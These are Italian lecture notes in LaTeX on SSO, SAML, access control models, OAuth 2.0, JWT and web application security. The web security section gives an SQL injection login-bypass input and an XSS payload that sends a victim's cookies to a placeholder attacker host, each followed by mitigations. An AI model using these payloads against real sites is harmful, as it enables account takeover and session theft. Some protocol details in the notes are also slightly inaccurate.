            \item L'\texttt{IdP} in primo luogo chiede all'utente di autenticarsi, il quale fornisce le proprie credenziali e l'\texttt{IdP} verifica l'identità dell'utente
            \item L'\texttt{IdP} genera un \textit{token} che viene cifrato e firmato con la chiave privata dell'\texttt{IdP} e inviato all'applicazione \texttt{SP}
            \item L'applicazione \texttt{SP} verifica la firma del \textit{token} con la chiave pubblica dell'\texttt{IdP} e se la verifica è positiva lo considera valido e lo inoltra all'utente che lo utilizzerà per accedere ai servizi (includendolo nelle richieste)
        \end{enumerate}
        Questo è il processo che avviene usualmente ma è possibile che il \textit{token} venga inviato all'utente dell'\texttt{IdP} e non direttamente all'applicazione del \texttt{SP}. In questo caso l'utente verifica la firma del \textit{token} con la chiave pubblica dell'\texttt{IdP} e poi lo includerà nelle richieste ai servizi.
    \paragraph{Proprietà} Le principali proprietà e vantaggi di un sistema \texttt{SSO} includono: la conservazioni delle credenziali in un unico posto e il non trasferimento delle stesse ad ogni servizio, i \textit{service provider} devono fidarsi dell'\textit{identity provider} nel verificare l'identità dell'utente. Inoltre il processo di autenticazione deve essere protetto, questo scopo lo si raggiunge usando la crittografia a chiave pubblica \footnote{ vedi \nameref{sec:PKI}} e con meccanismi di firma digitale.
    In questo paradigma è importante che l'\texttt{IdP} sia affidabile e che sia in grado di proteggere la \textit{confidentiality} e l'\textit{integrity} dei dati, inoltre è importante che l'\texttt{IdP} rimanga disponibile in quanto questo è un cosiddetto \textit{single point of failure}.
\section{Security Assertion Markup Language (\texttt{SAML})}
    \texttt{SAML} è un paradigma di autenticazione standard che sfrutta il formato \texttt{XML} per lo scambio di informazioni, questo lo rende molto \textit{verbose} anche per una piccola porzione di dati. Questo standard è stato introdotto nel 2002 e aggiornato nel 2005 in risposta alla mancanza di standard per lo scambio di informazioni di autenticazione e autorizzazione tra domini diversi.
    
    \begin{wrapfigure}{r}{0.25\textwidth}
        \centering
        \includegraphics[width=0.25\textwidth]{05/SAML-Auth.png}
        \caption{Esempio di utilizzo di \texttt{SAML}}
    \end{wrapfigure}
    \paragraph{Esempio d'uso di \texttt{SAML}} In uno scenario dove ad esempio per avere uno sconto sul noleggio di un'auto è necessario essere membri VIP di una compagnia aerea, allora un utente (\textit{alice}) eseguirà il login sul sito della compagnia aerea (che agisce da \texttt{IdP} e \texttt{SP}) e poi verrà reindirizzata al sito di noleggio auto (che agisce solo da \texttt{SP}) con le informazioni dello status VIP dell'utente. A questo punto \textit{alice} può ottenere lo sconto da parte del sito di noleggio auto anche senza essersi autenticata su quest'ultimo, in quanto valgono le informazioni inviate dal sito della compagnia aerea.\newline
    In breve:
        \begin{enumerate}
            \item L'utente vuole accedere ad un servizio \texttt{SP}
            \item Questo servizio \texttt{SP} reindirizza l'utente ad un \textit{Discovery Service} che permettere all'utente di scegliere l'\texttt{IdP} per l'autenticazione
            \item Dopo essersi registrato tramite il \texttt{IdP} scelto l'utente torna al servizio \texttt{SP} con una identità valida verificato da un \texttt{IdP}
            \item Allora il fornitore di servizi rimanda l'utente al suo \texttt{IdP} per ottenere un \textit{token} di autorizzazione
            \item L'utente si autentica sul \texttt{IdP} e ottiene un \textit{token} di autorizzazione
            \item L'utente ritorna al servizio \texttt{SP} con il \textit{token} di autorizzazione e può accedere ai servizi
        \end{enumerate}
    
    \subsection{\texttt{SAML} Overview}
        Come mostrato in figura \ref{fig:saml-overview} l'architettura di \texttt{SAML} è composto da diversi componenti quali:
        \begin{description}
            \item[\textit{Assertions}] - Le dichiarazioni fatte dal \texttt{IdP} riguardo l'identità dell'utente
            \item[\textit{Protocols}] - I protocolli usati per lo scambio di informazioni tra i vari componenti
            \item[\textit{Bindings}] - I meccanismi usati per associare i protocolli di \texttt{SAML} con i protocolli di comunicazione
            \item[\textit{Profiles}] - La combinazione di \textit{Assertions}, \textit{Protocols} e \textit{Bindings} a supporto di uno specifico caso d'uso
            \item[\textit{Authentication Context}] - Un dettaglio sui tipo di autenticazione e livello di sicurezza
            \item[\textit{Metadata}] - Dati di configurazione per \texttt{IdP} e \texttt{SP}
        \end{description}
        \begin{figure}[H]
            \label{fig:saml-overview}
            \centering
            \includegraphics[width=0.5\textwidth]{05/SAML-Overview.png}
            \caption{Overview di \texttt{SAML}}
        \end{figure}
        \subsubsection{\textit{Assertions}}
            Le \textit{Assertions} sono le dichiarazioni fatte da una \texttt{SAML} \textit{authority} detta anche "parte dichiarante" (\textit{asserting party}). Le assertions possono essere viste come le unità di informazione di \texttt{SAML} e sono divise in tre tipi:
            \begin{description}
                \item[\textit{Authentication Assertion}] - Rilasciato dalla parte che autentica l'utente, contiene informazioni quali: chi ha autenticato l'utente, chi è il soggetto autenticato, quando è valida l'autenticazione, ecc\dots
                \item[\textit{Attribute Assertion}] - Contiene informazioni sullo stato dell'utente, come nell'esempio di \textit{alice} l'appartenenza al programma VIP
                \item[\textit{Authorization Assertion}] - Contiene informazioni su cosa può fare l'utente, come ad esempio la possibilità di noleggiare un'auto quando in viaggio di lavoro
            \end{description}
            \paragraph{\textit{Authentication Assertion}}
                Questo tipo di \textit{assertion} è strutturato nel seguente modo:
                \begin{description}
                    \item[Intestazione] - Contiene informazioni sulla versione di \texttt{SAML} usata, lo schema per \texttt{XML} e l'ora di creazione (\textit{issue instant})
                    \item[Autorità] - Contiene informazioni sul \texttt{IdP} che ha rilasciato l'\textit{assertion}
                    \item[Soggetto] - Contiene un identificativo univoco che rappresenta l'utente autenticato
                    \item[Condizioni] - Contiene informazioni sulla validità dell'\textit{assertion} (vale non prima di, non dopo il) con data e ora
                    \item[\textit{Authenticating Context}] - Contiene informazioni sul tipo di autenticazione e il livello di sicurezza che è stato usato\footnote{Si noti come la autenticazione in se non è parte del \texttt{SAML}, nelle \textit{assertion} ci si riferisce ad un processo di autenticazione avvenuto precedentemente}
                \end{description}
            \paragraph{\textit{Attribute Assertion}}
                Questo tipo di \textit{assertion} è strutturato nel seguente modo:
                \begin{description}
                    \item[Intestazione] - Contiene informazioni sulla versione di \texttt{SAML} usata, lo schema per \texttt{XML} e l'ora di creazione (\textit{issue instant}) l'unica differenza con l'\textit{Authentication Assertion} è il tipo di schema usato
                    \item[Attributo] - Contiene un identificatore del tipo di attributo (solitamente in modo molto specifico) e il valore dell'attributo
                \end{description}
        \subsubsection{\textit{Protocols}}
            I protocolli sono i meccanismi usati per lo scambio di asserzioni tra le varie parti e descrivono come poterne ottenerne una, come usarla e come verificarla. Vengono definiti anche protocolli sulle richieste di autenticazione e sulla risoluzione di parametri "passati per riferimento", viene definito anche un protocollo per il \textit{single logout} e per la gestione delle sessioni, e molo altro\dots\newline
            Distinguiamo come protocolli di comunicazione quei sistemi che permettono a due o più entità di scambiarsi informazioni definendo regole, semantica, sintassi e sincronizzazione. Esistono inoltre i protocolli di criptografia che sono designati alla protezione della comunicazione tra due entità, vengono applicati usando i \textit{cryptographic primitives} (come funzioni di \textit{hash}, cifrature simmetriche e asimmetriche, ecc\dots).
        \subsubsection{\textit{Bindings}}
            I \textit{bindings}, come anticipato, sono i meccanismi usati per definire i meccanismi per il trasporto dei messaggi \texttt{SAML} su protocolli di comunicazione diversi, come ad esempio \texttt{SAML URI}, \texttt{SAML SOAP}, \texttt{HTTP Redirect}, \texttt{HTTP POST}, ecc\dots
            \paragraph{\texttt{HTTP Redirect}} Questo meccanismo, in particolare, permette la trasmissioni di messaggi \texttt{SAML} tramite parametri di \texttt{URL} in una richiesta. In questo modo viene usato lo \textit{UserAgent} come intermediario per la trasmissione dei messaggi, questo meccanismo potrebbe essere necessario se è richiesta l'interazione con l'utente per generare una risposta. Questo è di gran lunga il meccanismo più usato (oltre che il preferito) per la trasmissione di messaggi \texttt{SAML} e per il \textit{SSO}.
    \chapter{Access Control I}
\label{chap:accessControl}
\thispagestyle{chapterInit}

\paragraph{Obbiettivi} Gli obbiettivi dei sistemi di controllo degli accessi sono:
    \begin{itemize}
        \item \textbf{Confidenzialità}: garantire che le informazioni siano accessibili solo a chi è autorizzato.
        \item \textbf{Integrità}: garantire che le informazioni non siano alterate da chi non è autorizzato.
    \end{itemize}

\section{Access Control}
    \begin{figure}[H]
        \label{fig:accessControlSchema}
        \centering
        \includegraphics[scale=0.5]{06/AccessControSchema.png}
        \caption{Schema di un sistema di controllo degli accessi}
    \end{figure}

    Dallo schema raffigurato possiamo denotare che:
    \begin{itemize}
        \item \textbf{Soggetto} (\textit{Agent/Principal}): è l'entità che vuole accedere ad un oggetto o una risorsa, questo deve essere autenticato e autorizzato per poter accedere. Ad esempio un operatore di cassa di una banca non può accedere ai dati dei clienti, ma dopo aver ricevuto opportuna autorizzazione può effettuare operazioni sui conti.
        \item \textbf{Richiesta} (\textit{Request}): è la richiesta di accesso fatta dal soggetto. Questa contiene diverse informazioni che vedremo in seguito.
        \item \textbf{Confine di Isolamento} (\textit{Isolation Boundary}): è il confine che separa il soggetto dal sistema che contiene l'oggetto o la risorsa. Questo confine è importante per garantire che il soggetto non possa accedere direttamente all'oggetto o alla risorsa.
        \item \textit\textbf{Guard} (\textit{Policy Decision Point}): è l'entità che decide se il soggetto può accedere all'oggetto o alla risorsa. Questo prende decisioni basandosi su regole di autorizzazione.  
        \item \textit\textbf{Policy}: è l'insieme di regole che il \textit{guard} deve seguire per decidere se il soggetto può accedere all'oggetto o alla risorsa.
        \item \textbf{Oggetto} (\textit{Object/Resource}): è l'entità a cui il soggetto vuole accedere. Questo può essere un file, un database, un dispositivo, ecc\dots Questo deve essere protetto per garantire la confidenzialità e l'integrità delle informazioni.
        \item \textbf{Sistema Controllo Accessi} (\textit{Access Control }): è il punto dove avviene il controllo degli accessi. (Solitamente il \textit{guard} è una parte di questo sistema).
        \item \textit\textbf{Audit Log}: è il registro che contiene tutte le informazioni riguardanti le richieste di accesso sia autorizzate che non autorizzate. Questo è importante per monitorare il sistema e per rilevare eventuali attacchi.
    \end{itemize}
    
    \paragraph{Alcune note} Il confine di Isolamento tra il soggetto e tutto il resto del sistema è molto importante per garantire che nessuno possa accedere direttamente all'oggetto o alla risorsa senza passare per il \textit{guard}. Solo degli utenti con privilegi speciali, quali "amministratori" possono \textit{by-passare il guard} questo solo per aggiornare delle \textit{policy} o altri aggiornamenti al sistema. Infine è presente anche una \textit{inner boundary} che garantisce l'integrità dell'\textit{audit log}, questa non può essere \textit{by-passata} da nessuno, nemmeno dagli amministratori.
    \subsection{I Sistemi Operativi}
        I sistemi operativi sono esempi di sistemi che implementano il controllo degli accessi. Questi infatti non permettono di accedere direttamente alle risorse \textit{hardware} e \textit{software} del sistema, ma forniscono un'interfaccia per accedere a queste. Inoltre alcuni \texttt{SO} supportano multi-utente e multi-tasking, dove per il primo bisogna implementare un sistema per garantire accesso allo stesso tempo e/o in modo concorrente a più utenti, mentre per il secondo bisogna sviluppare un sistema per garantire che più processi in parallelo possano accedere alle risorse del sistema in modo concorrente.
        \subsubsection{Struttura del \texttt{SO}}
            Un sistema operativo è composto da una memoria, accessibile agli utenti, la quale comunica con il sistema operativo che tramite appositi meccanismi di controllo degli accessi permette di accedere al \texttt{I/O} \textit{bus} dove sono collocate le \texttt{I/O} \textit{interfaces} che permettono di accedere alle risorse del sistema (dischi, stampanti,\dots).\newline
            In questo sistema bisogna proteggere la memoria, i file contenuti nei dischi, controllare l'accesso degli utenti tramite meccanismi di autenticazione e autorizzazione e infine proteggere in generale il controllo degli accessi.
            \paragraph{Cosa implementa \texttt{SO}} Facendo riferimento alla figura \figref{fig:accessControlSchema}, il sistema operativo dunque implementa l'autenticazione, l'autorizzazione e la barriera di isolamento esterna per garantire che le \textit{policy} siano rispettate.
    \subsection{Definizione, Scopo e \textit{Policy} di un \texttt{AC}}
        \paragraph{Definizione} Un sistema di controllo accessi è definito come il processo che \textbf{media} le \textbf{richieste} alle risorse e ai dati di un sistema determinando se la richiesta di accesso deve essere approvata o rifiutata.
            \subparagraph{\textit{Flow} della richiesta} \begin{enumerate}
                \item Una richiesta di accesso $(s,a,r)$ viene fatta da un soggetto $s$ per accedere ad un oggetto $r$ tramite un'azione $a$. Questa arriva al modulo di controllo accessi
                \item Il modulo di controllo accessi prende la decisione se approvare (\textit{grant}) o rifiutare (\textit{deny}) la richiesta.
                \item Se la risposta è \textit{grant} allora $s$ può eseguire l'operazione $a$ su $r$, altrimenti se la risposta è \textit{deny} allora $s$ è informato che \underline{non} può eseguire l'operazione $a$ su $r$.
            \end{enumerate}
        Questo processo è di fondamentale importanza in un qualsiasi sistema di sicurezza.
    \chapter{Access Control II}
\label{ch:accessControlII}
\section{\textit{Attribute Based Access Control} \texttt{ABAC} (\texttt{XACML})}    
    La differenza tra un \texttt{RBAC}\footnote{Vedi sotto sezione \ref{subsec:RBAC} - \nameref{subsec:RBAC}} e un \texttt{ABAC} è che il primo si basa su ruoli assegnati ad un utente, mentre il secondo si basa su una serie di attributi della risorsa (come l'utente che la ha creata). Oltre a questo l'\texttt{ABAC} si basa su una serie di regole che definiscono i privilegi di accesso. 
    \paragraph{Punti di forza} I punti di forza dell'\texttt{ABAC} sono:
        \begin{itemize}
            \item \textbf{Flessibilità e potenza espressiva}: permette di definire regole molto complesse.
            \item \textbf{Possibilità di combinare diversi pattern di autorizzazione} 
            \item \textbf{Possibilità di considerare condizioni di autorizzazione sulla base di attributo dell'ambiente}
        \end{itemize}
    \paragraph{Fondamenta di \texttt{ABAC}} I sistemi \texttt {ABAC} si basano su tre differenti tipi di attributo: 
        \begin{itemize}
            \item \textbf{Attributi dell'utente}: come il ruolo, il dipartimento, il manager, il livello di sicurezza, ecc.
            \item \textbf{Attributi della risorsa}: come il proprietario, il dipartimento, il livello di sensibilità, ecc.
            \item \textbf{Attributi dell'ambiente}: come l'indirizzo IP, il tempo, la posizione, ecc.
        \end{itemize}
    \paragraph{XACML}
    \texttt{XACML} ovvero \textit{eXtensible Access Control Markup Language} è un linguaggio che punta a definire un modello standard basato su \texttt{ABAC}. Questo linguaggio è stato sviluppato per definire politiche di controllo di accesso, non solo stabilendo una lista di azioni permesse, quindi tutto ciò che non è permesso è proibito, ma anche definendo una serie di regole di negazione di accesso.\newline
    Inoltre \texttt{XACML} è estensibile ed codificato in \texttt{XML} e permette di definire regole molto complesse.
    \subsection{Struttura di una \textit{rule}}
        Una regola di \texttt{XACML} è composta da:
        \begin{itemize}
            \item \textbf{Target}: definisce a quali risorse si applica la regola.
            \item \textbf{Condition}: definisce le condizioni che devono essere soddisfatte per applicare la regola.
            \item \textbf{Effect}: definisce l'effetto della regola, ovvero se l'accesso è permesso o negato.
        \end{itemize}
        Le regole possono essere valutate a \textit{true}, \textit{false} o \textit{indeterminate} (quando non è possibile determinare il risultato della valutazione).
    \subsection{Struttura di una \textit{policy}}
        Una \textit{policy} è una struttura che contiene un insieme di regole. Queste \textit{policy} sono strutturate come un "\textit{policy set}" che contiene un insieme di \textit{policy}, ma possono anche contenere altre \textit{policy set}. Lo scopo di una \textit{policy} è una condizione booleana che se vera allora la richiesta viene valutata da un \texttt{PDP} altrimenti viene ignorata.\newline
        Possono essere definiti inoltre diversi tipi di combinazioni tra le regole, come:
        \begin{itemize}
            \item \textbf{First applicable}: valuta le regole in ordine e applica la prima che soddisfa la richiesta.
            \item \textbf{Deny overrides}: valuta le regole in ordine e applica la prima che nega l'accesso.
            \item \textbf{Permit overrides}: valuta le regole in ordine e applica la prima che permette l'accesso.
            \item \textbf{Only one applicable}: valuta le regole in ordine e applica la prima che soddisfa la richiesta, se più di una regola soddisfa la richiesta la richiesta viene negata.
        \end{itemize}
    \subsection{Architettura per il controllo degli accessi}
        \begin{figure}[H]
            \centering
            \includegraphics[scale=0.5]{07/XACML-Architecture.png}
            \caption{Architettura per il controllo degli accessi}
        \end{figure}
        
        Nella figura sopra possiamo vedere l'architettura per il controllo degli accessi con \texttt{XACML}. Questa architettura è composta da molte componenti che sono:
        \begin{description}
            \item[\texttt{PEP}]: \textit{Policy Enforcement Point} è l'entità che protegge la risorsa ed è il componente gli accesi facendo decisioni basate sulle richieste e facendo rispettare le decisioni.
            \item[\textit{Context Handler}]: è l'entità canonica che rappresenta di una decisione di accesso e autorizzazione. Viene designato alla conversione delle richieste da forma nativa a forma \texttt{XACML} e viceversa.
            \item[\texttt{PDP}]: \textit{Policy Decision Point} è l'entità che riceve e esamina le richieste, ricerca le \textit{policy} applicabili a quella richiesta, valuta le regole e invia la decisione di autorizzazione al \texttt{PEP}.
            \item[\texttt{PAP}]: \textit{Policy Administration Point} è l'entità che si occupa della gestione e conservazione delle \textit{policy} e delle regole.
            \item[\texttt{PIP}]: \textit{Policy Information Point} è l'entità che funge da sorgente degli attributi e dei dati necessari per valutare le \textit{policy}.
        \end{description}
\section{\texttt{OAUTH 2.0}}
    \texttt{OAUTH 2.0} è un protocollo di autorizzazione che permette di delegare solo certe autorizzazioni per l'accesso ad una risorsa. Ad esempio se si vuole fornire l'accesso ad una terza applicazione verso una risorsa di un utente, si può utilizzare \texttt{OAUTH 2.0} per delegare l'accesso a quella risorsa senza condividere le credenziali dell'utente.
    \paragraph{Flow Basico}
        \begin{enumerate}
            \item \textbf{Autenticazione}: l'utente si autentica presso il \textit{Resource Owner}. (non fa parte di \texttt{OAUTH 2.0})
            \item \textbf{Consenso Utente}: l'utente autorizza l'applicazione terza ad accedere per suo conto alla risorsa in questione.
            \item \textbf{Ricezione del Token}: il \textit{Resource Owner} genera un \texttt{OAuth Token} che contiene i permessi che l'utente ha concesso all'applicazione terza.
            \item \textbf{Accesso alla risorsa}: l'applicazione terza utilizza il \texttt{OAuth Token} per accedere alla risorsa.
        \end{enumerate}
    \paragraph{Flow di Autorizzazione}
        \begin{enumerate}
            \item Il \textit{client} ridirige il \textit{Resource Owner} all'\textit{endpoint} del \textit{Authorization Server}.
            \item Il \textit{Resource Owner} si autentica presso il \textit{Authorization Server}.
            \item Il \textit{Resource Owner} autorizza il \textit{client}
            \item A questo punto il \textit{Authorization Server} redirige il \textit{Resource Owner} al \textit{client} con un \texttt{authorization code}, questo non è il vero \texttt{token} per accedere alla risorsa ma è un \textit{token} che permette al \textit{client} di ottenere il \texttt{token} vero e proprio.
            \item Il \textit{client} invia il \texttt{authorization code} al \textit{Authorization Server} per ottenere il \texttt{token}, inoltre il \textit{client} deve autenticarsi presso il \textit{Authorization Server}.
            \item Il \textit{Authorization Server} invia una \texttt{OAuth access token} al \textit{client}.
            \item Il \textit{client} utilizza il \texttt{OAuth access token} per accedere alla risorsa.
        \end{enumerate}
    \subsection{Entità coinvolte}
        \subsubsection{\textit{Resourse Owner}}
            Questo è il proprietario della risorsa, generalmente è una persona che delega l'accesso a questa.
        \subsubsection{\textit{Protected Resource}}
            Queste risorse sono protette da parte del \textit{service provider} per conto del proprietario, le condivide solamente su richiesta di quest'ultimo.
        \subsubsection{\textit{Client}, App}
            Questa è l'applicazione che intende accedere alla risorsa, questo agisce come se fosse il proprietario su questa, ma solo dopo l'autorizzazione di quest'ultimo.
        \subsubsection{\textit{Authorization Server}}
            Questo \textit{server} è il responsabile per l'autenticazione dell'utente e per l'autenticazione delle risorse. È anche il responsabile per la gestione delle autorizzazioni ed genera un \textit{token} nel caso di autenticazione affermativa.
        \subsubsection{\textit{OAuth token}}
            Questo \textit{token} rappresenta le autorizzazioni delegate, come anticipato è generato dal'\textit{Authorization Server} ed è usato dal \textit{Client}
    \subsection{Note}
        Il protocollo è generalmente definito solo per \texttt{HTTP}, quindi per una comunicazione sicura viene usato \texttt{TLS}. \texttt{OAuth 2.0} non è un protocollo di autenticazione, ma dipende da questo in vari punti, questo non nega il fatto che i protocolli di autenticazione come \textit{OpenID Connect} si basino su \texttt{OAuth}.
        \subsubsection{Autenticazione con \texttt{OpenID Connect}}
            In quanto usare \texttt{OAuth 2.0} per il processo di autenticazione non è appropriato, in quanto l'utente deve essere presente solo al primo accesso, viene introdotto \texttt{OpenID Connect} 
\section{\texttt{JWT} - \textit{JSON Web Token}}
    \texttt{JWT} ovvero \textit{JSON Web Token} è uno standard aperto che definisce un modo compatto e autonomo per trasmettere informazioni tra due parti. Questo standard è usabile di fatto anche per \texttt{OAuth 2.0}, in quanto permette di trasmettere informazioni tra due parti in modo sicuro e firmato.
    \paragraph{Struttura}
        Un \texttt{JWT} è composto da tre parti separate da un punto:
        \begin{itemize}
            \item \textbf{Header}: contiene il tipo di token e l'algoritmo di firma.
            \item \textbf{Payload}: contiene le informazioni che si vogliono trasmettere come ad esempio l'identità dell'utente.
            \item \textbf{Signature}: contiene la firma del token, questa viene generata utilizzando l'header, il payload e una chiave segreta. Questa firma permette di verificare l'integrità del token, ma non permette di verificare la confidenzialità e l'autenticità.
        \end{itemize}
        La concatenazione di queste tre parti forma il \textit{token} \texttt{JWT}.
    \paragraph{Punti di forza}
        In quanto \texttt{JSON} è molto meno verboso di \texttt{XML} quando codificato è anche molto più leggero, il che lo rende ideale per essere trasportato in \texttt{HTTP} e \texttt{HTML}. Allo stesso modo \texttt{SAML} e \texttt{JWT} possono essere usati come coppia di chiave pubblica/privata nella forma di un certificato \texttt{X.509} per firmare e verificare i token.
    \chapter{Web and IoT Security \& The Zero Trust Model}
\thispagestyle{chapterInit}
\section{Web Security}
    \subsection{Introduzione}
        \subsubsection{Il modello \textit{client}/\textit{server}}
            Il modello \textit{client}/\textit{server} è il modello di comunicazione più diffuso quando si parla di web. Il \textit{server} rappresenta l'astrazione delle risorse di un computer, mentre i \textit{client} che non si curano di come il \textit{server} gestisca la \textbf{richiesta} a patto che quest'ultimo invii una \textbf{risposta}. L'unica cosa che il \textit{client} necessita di sapere è il \textbf{protocollo} di comunicazione, ovvero il contenuto e il formato della richiesta e della risposta per il servizio richiesto.\newline
            Come anticipato il \textit{server} e il \textit{client} si scambiano dei messaggi, questi nella modalità \textbf{richiesta}-\textbf{risposta} ovvero il \textit{client} inizializza la comunicazione inviando una richiesta al \textit{server} che è sempre in ascolto e risponde con una risposta. Per lavorare bene entrambe le parti devono concordare su un linguaggio comune e devono seguire delle regole, ovvero un \textbf{protocollo}.
            \paragraph{Il protocollo \texttt{HTTP}} Il protocollo \texttt{HTTP} (\textit{HyperText Transfer Protocol}) è un protocollo "\textit{stateless}" che non conserva informazioni sullo stato della comunicazione, ed lavora al livello applicazione. Questo è alla base del \texttt{WWW} sin dal 1990 ed ha delle caratteristiche fondamentali:\begin{description}
                \item[\textit{Connectionless}] Quando un \textit{client} esegue una richiesta questa viene aperta una connessione con il \textit{server}, la richiesta viene processata e la connessione viene chiusa. Quando il \textit{server} invia la risposta viene aperta una nuova connessione e così via.
                \item[\textit{Media Independent}] Il protocollo \texttt{HTTP} non è legato ad un particolare tipo di media, ovvero può inviare qualsiasi tipo di dato.
                \item[\textit{Stateless}] Come anticipato il protocollo \texttt{HTTP} non mantiene informazioni sullo stato della comunicazione, ovvero non mantiene informazioni sulle richieste precedenti. Quindi quando un \textit{client} esegue una richiesta il \textit{server} non sa nulla delle richieste precedenti.
            \end{description}
        \subsubsection{Rendere sicure le applicazioni web}
            Creare una applicazione web è semplice, ma creare una applicazione web sicura è difficile e noioso. In quanto il web si basa su un modello multi-livello i problemi di sicurezza possono essere presenti ad ogni livello. Di una applicazione devono essere infatti messi in sicurezza: il \textit{database}, il \textit{server}, la applicazione in se ed infine la rete. Questo deve essere fatto in quanto bisogna considerare molti tipi diversi di attacchi come ad esempio: un \textit{malware attacker} che risiede nel computer dell'utente, un \textit{network attacker} che agisce sulla rete o un \textit{web attacker} che agisce direttamente sui \textit{server} (sia web che \textit{database}).
        \subsubsection{Minacce delle applicazioni web}
            Come già anticipato le applicazioni web sono soggette a molte minacce possiamo classificarle per il livello e per il luogo dove avvengono.
            \begin{itemize}
                \item \underline{\textbf{\textit{Application-Layer}}} \begin{itemize}
                    \item \texttt{SQL} \textit{Injection}
                    \item \textit{Cross-Site Scripting} (\texttt{XSS})
                    \item \textit{Cross-Site Request Forgery} (\texttt{CSRF})
                    \item \textit{Broken Authentication}
                    \item \textit{Unvalidated input}
                \end{itemize}
                \item \textbf{\textit{Server-Layer}} \begin{itemize}
                    \item \textit{Denial of Service} (\texttt{DoS})
                    \item \texttt{OS} \textit{Exploits}
                \end{itemize}
                \item \textbf{\textit{Network-Layer}} \begin{itemize}
                    \item \textit{Packet Sniffing}
                    \item \textit{Man-in-the-Middle} (\texttt{MitM})
                    \item \textit{DNS Spoofing}
                \end{itemize}
                \item \textbf{\textit{User-Layer}} \begin{itemize}
                    \item \underline{\textit{Phishing}}
                    \item \textit{Key-Logging}
                    \item \textit{Malware}
                \end{itemize}
            \end{itemize}
            Noi ci concentreremo sulle minacce \textit{Application-Layer} ed inoltre sugli attacchi di \textit{Phishing}.
            \paragraph{Requisiti di una web-app} Solitamente una applicazione web deve soddisfare i seguenti requisiti:\begin{description}
                \item[\textit{Authentication}] Vuoi sapere con chi stai parlando.
                \item[\textit{Authorization} (\textit{Access Control})] L'utente può avere accesso solo a quelle risorse alle quali ha diritto.
                \item[\textit{Confidentiality}] I dati devono essere protetti e mantenuti segreti.
                \item[\textit{Integrity}] I dati non devono essere modificati nel trasporto.
                \item[\textit{Non-Repudiation}] L'utente non può negare di aver eseguito una azione.
            \end{description}
            \paragraph{Definizione di sicurezza per una web-app} la \textit{Web Application security} è un insieme di \underline{informazioni di} \underline{sicurezza} che gestisce specificamente la \underline{sicurezza di siti web, di applicazioni web e di servizi web}. Ad alto livello la sicurezza delle applicazioni web si basa sul principio di \textbf{sicurezza delle applicazioni} ma si applica specificamente alle applicazioni web.\newline
            La \textbf{Sicurezza delle applicazioni} è un insieme di misure implementate da una applicazione per \underline{trovare,} \underline{correggere e prevenire vurnerabilità per la sicurezza}.
    \subsection{\textit{Injection Attacks}}
        \subsubsection{\texttt{SQL} \textit{injection}}
            L'\texttt{SQL} \textit{injection} è un attacco che sfrutta le vulnerabilità di un'applicazione web che non controlla correttamente i dati inseriti dall'utente.
            \paragraph{PoC - Proof of Concept} Supponiamo di avere un'applicazione web che permette di eseguire il login tramite username e password, la query \texttt{SQL} che viene eseguita è la seguente: 
            \begin{lstlisting}
SELECT * FROM users WHERE username = '$username' AND password = '$password';\end{lstlisting}
            Se l'utente inserisce come username \texttt{admin} e come password \texttt{admin} la query diventa:
            \begin{lstlisting}
SELECT * FROM users WHERE username = 'admin' AND password = 'admin';\end{lstlisting}
            Il che è il funzionamento che ci aspettiamo. Supponiamo ora che un utente che non conosce la password dell'utente \texttt{admin} inserisca come nome utente \texttt{admin';--} e come password \texttt{qualunquecosa}. La query diventa:
            \begin{lstlisting}
SELECT * FROM users WHERE username = 'admin';--' AND password = 'qualunquecosa';\end{lstlisting}
            In quanto il \texttt{--} è un commento in \texttt{SQL} la query diventa:
            \begin{lstlisting}
SELECT * FROM users WHERE username = 'admin';\end{lstlisting}
            Quindi l'utente malintenzionato è riuscito ad accedere come \texttt{admin} senza conoscere la password. 
            \paragraph{Obbiettivi} Gli obbiettivi di chi tenta di eseguire un attacco di \texttt{SQL} \textit{injection} possono essere molteplici, a partire dell'ottenimento di dati sensibili fino ad arrivare all'eliminazione di interi \textit{dataset}.
            \paragraph{Mitigazioni} Per mitigare gli attacchi di \texttt{SQL} \textit{injection} è necessario fare un \textbf{input sanitization} ovvero controllare e pulire i dati inseriti dall'utente andando a fare l'\textit{escaping} dei caratteri speciali che potrebbero essere inseriti. Inoltre è possibile utilizzare \textbf{prepared statements} ovvero query precompilate che vengono eseguite in modo sicuro. Inoltre dovrebbe essere applicato il principio di \textbf{Least Privilege} ovvero bisogna dare l'accesso minimo necessario all'applicazione per funzionare senza fornire permessi inutili e/o accesso con permessi di amministratore ad una applicazione.
    \subsection{\textit{Cross-Site Scripting} (\texttt{XSS})}
        Il \textit{Cross-Site Scripting} (\texttt{XSS}) è un attacco che permette ad un attaccante di eseguire codice \texttt{JavaScript} all'interno di una applicazione web. Questo attacco è possibile quando un'applicazione web permette di inserire codice \texttt{JS} all'interno di un campo di input e questo codice viene poi eseguito da un altro utente.
        \paragraph{PoC - Proof of Concept} Supponiamo di avere un'applicazione web che permette di inserire un commento all'interno di un post, se un utente inserisce come commento il seguente codice:
        \begin{lstlisting}
<script>window.open('http://attacker.com?cookie=' + document.cookie)</script>\end{lstlisting}
        Allora l'url che si genera è il seguente:
        \begin{lstlisting}
http://applicazione.com/post?comment=<script>window.open('http://attacker.com?cookie=' + document.cookie)</script>\end{lstlisting}
        Se il sito \texttt{applicazione.com} è vulnerabile all'attacco di \texttt{XSS} allora il codice \texttt{JS} viene eseguito e l'attaccante riceve i \textit{cookie} della vittima. Nei \textit{cookie} potrebbero essere presenti informazioni sensibili come ad esempio \texttt{JWT} o \textit{session token}.\footnote{Ne abbiamo discusso nel capitolo \ref{ch:accessControlII} - \nameref{ch:accessControlII}}
        \paragraph{Funzionamento in 3 step} \begin{itemize}
            \item L'attaccante invia un messaggio alla vittima contenente un url vulnerabile al quale sono stati aggiunti dei parametri che eseguono codice \texttt{JS}.
            \item La vittima clicca sul link e se il sito è vulnerabile il codice \texttt{JS} viene eseguito, questo codice potrebbe inviare i \textit{cookie} della vittima ad un server controllato dall'attaccante.
            \item L'attaccante riceve i \textit{cookie} della vittima e può impersonarla.
        \end{itemize}
        \paragraph{Mitigazioni} 
            Per mitigare gli attacchi di \texttt{XSS} è necessario filtrare tutti i parametri che vengono passati tramite \texttt{HTTP GET} o \texttt{POST} e fare l'\textit{escaping} dei caratteri speciali. La miglior soluzione è comunque quella di definire dei caratteri ammessi tramite \texttt{RegEx} e filtrare i parametri in base a questi ritornando un errore se il parametro non è valido.
    \subsection{\textit{Access Control Violation}}
        \subsubsection{Preambolo - perchè l'\texttt{AC} è importante delle web-app}
